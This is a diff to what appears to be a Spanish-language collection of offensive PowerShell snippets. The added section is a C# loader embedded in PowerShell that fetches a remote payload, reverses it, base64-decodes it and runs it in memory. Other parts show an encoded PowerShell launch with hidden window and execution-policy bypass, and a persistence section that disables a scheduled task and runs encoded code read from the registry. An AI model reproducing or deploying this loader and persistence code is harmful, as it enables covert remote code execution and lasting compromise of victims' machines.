@@ -51,6 +51,41 @@ start $Image
 
 ---------------------
 
+Powershell C#
+
+$CODIGO=@"
+
+using System;
+using System.Net;
+namespace Helloword
+{
+
+     public static class Hello{
+     public static void Main(){
+WebClient client = new WebClient ();
+string reply = client.DownloadString ("ip/1.txt");
+ 
+Object f= AppDomain.CurrentDomain.Load(Convert.FromBase64String(ReverseString(reply))).EntryPoint.Invoke(null,null);
+
+       }
+       
+public static string ReverseString(string s)
+       {
+            char[] arr = s.ToCharArray();
+            Array.Reverse(arr);
+            return new string(arr);
+       }
+    }
+}
+
+"@
+
+Codif in base64
+
+powershell -wind 1 -noexit -exec bypass -enc eeeeeewereara         or -file ""c:\windows\1.ps1!!
+
+---------------------
+Persistencia
 start-process -windowstyle hidden schtasks '/change /tn AI /disable';
 $appdata_fullpath = $env:userprofile+'\AppData\Roaming'; 
 $comp_uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID; 
@@ -77,7 +112,8 @@ function HexToString($i) {
     return $r
     }
     $aa = HexToString ($value."(Default)")
-   powershell -noexit -enc $aa
+    
+ powershell -noexit -enc $aa
    -----------------------------------------
 $startlogin = @" 
                               ...----....
